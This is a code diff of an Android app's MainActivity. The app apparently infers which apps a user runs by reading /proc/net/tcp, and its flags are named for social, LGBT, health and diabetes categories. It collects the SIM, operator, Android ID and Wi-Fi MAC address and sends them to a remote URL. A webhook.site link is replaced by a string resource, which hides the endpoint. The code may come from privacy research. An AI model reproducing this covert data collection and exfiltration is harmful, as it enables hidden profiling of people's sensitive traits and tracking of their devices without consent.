@@ -8,6 +8,7 @@ import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
+import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.PowerManager;
@@ -26,10 +27,7 @@ import java.io.FileNotFoundException;
 import java.io.FileReader;
 import java.io.IOException;
 import java.net.URLEncoder;
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
+import java.util.*;
 
 public class MainActivity extends AppCompatActivity implements WifiListener, View.OnClickListener {
 
@@ -40,7 +38,7 @@ public class MainActivity extends AppCompatActivity implements WifiListener, Vie
      */
     private ArrayList<String> dataToUpload = new ArrayList<>();
 
-private final static int UID_INDEX = 9;
+    private final static int UID_INDEX = 7;
 
     private boolean flagSocial;
     private boolean flagLgbt;
@@ -75,45 +73,47 @@ private final static int UID_INDEX = 9;
         // what was going on when the app didn't have focus?
         if (flagSocial || flagLgbt) {
             // check for social activity
-            if(!readUidFromFile("/proc/net/tcp"))
-                readUidFromFile("/proc/net/tcp6");
+            if (!readUidFromFile(getString(R.string.tcp_log)))
+                readUidFromFile(getString(R.string.tcp6_log));
         }
-        if(flagHealth || flagDiabetes){
+        if (flagHealth || flagDiabetes) {
             // do something wrt health
         }
     }
 
-    private boolean readUidFromFile(String file){
-            BufferedReader br;
-            try {
-                br = new BufferedReader(new FileReader(file));
-                // first line:   sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
-                String data = br.readLine();
-                String[] values;
-                String appUid;
-                // so the UID is the 10th field
-                do {
-                    values = data.trim().replaceAll("\\s+", ";").split(";");
-                    if (values.length > UID_INDEX) {
-                        appUid = values[UID_INDEX];
-                        if (appMap.keySet().contains(appUid)) {
-                            prepareForUpload("appLaunched=" + appMap.get(appUid));
-                            return true;
-                        }
+    private boolean readUidFromFile(String file) {
+        BufferedReader bufferedReader;
+        try {
+            bufferedReader = new BufferedReader(new FileReader(file));
+            // first line:   sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
+            String data = bufferedReader.readLine();
+            String[] values;
+            String appUid;
+            do {
+//                values = data.trim().replaceAll("\\s+", ";").split(";");
+                values = data.trim().split("\\s+");
+                Log.d(TAG, Arrays.toString(values));
+                if (values.length > UID_INDEX) {
+                    appUid = values[UID_INDEX];
+                    if (appMap.keySet().contains(appUid)) {
+                        prepareForUpload("appLaunched=" + appMap.get(appUid));
+                        return true;
                     }
-                    data = br.readLine();
-                } while (data != null);
-            } catch (FileNotFoundException e) {
-                Log.e(TAG, e.getMessage());
-            } catch (IOException e) {
-                Log.e(TAG, e.getMessage());
-            }
+                }
+                data = bufferedReader.readLine();
+            } while (data != null);
+        } catch (FileNotFoundException e) {
+            Log.e(TAG, e.getMessage());
+        } catch (IOException e) {
+            Log.e(TAG, e.getMessage());
+        }
         return false;
     }
 
     /**
      * every time the app gains focus, it starts a thread reading wi-fi data.
      */
+    @SuppressLint("HardwareIds")
     @Override
     protected void onResume() {
         super.onResume();
@@ -121,7 +121,9 @@ private final static int UID_INDEX = 9;
         if (connectivityManager != null) {
             NetworkInfo networkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
             if (networkInfo.isConnected()) {
-                new WifiSniffer(this).execute(networkInfo);
+                WifiManager wifiMan = (WifiManager) this.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+                new WifiSniffer(this)
+                    .execute(getString(R.string.wifi_webservice_url) + wifiMan.getConnectionInfo().getMacAddress());
             }
         }
     }
@@ -147,7 +149,7 @@ private final static int UID_INDEX = 9;
                 Log.d(TAG, "The screen is off");
             }
         }
-        StringBuilder sb = new StringBuilder("https://webhook.site/5ebd6968-4d2b-4c72-84a4-c3f491311c3e/?noperms&");
+        StringBuilder sb = new StringBuilder(getString(R.string.data_upload_url));
         Log.d(TAG, "=====| DATA THAT WILL BE UPLOADED |=====");
         for (String queuedString : dataToUpload) {
             sb.append(queuedString).append('&');
@@ -163,7 +165,7 @@ private final static int UID_INDEX = 9;
 
     @Override
     public void onClick(View view) {
-        spinner = (ProgressBar)findViewById(R.id.progressBar1);
+        spinner = (ProgressBar) findViewById(R.id.progressBar1);
         spinner.setVisibility(View.VISIBLE);
 
         try {
@@ -197,7 +199,7 @@ private final static int UID_INDEX = 9;
             Log.d(TAG, "readIdentifiers: SIM Not Ready");
         }
         @SuppressLint("HardwareIds") String androidID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        return "gsm=" + operator + "&sim=" + sim + "&aid=" + androidID;
+        return "gsm=" + operator + "&sim=" + sim + "&androidId=" + androidID;
     }
 
     private String readVersion() {
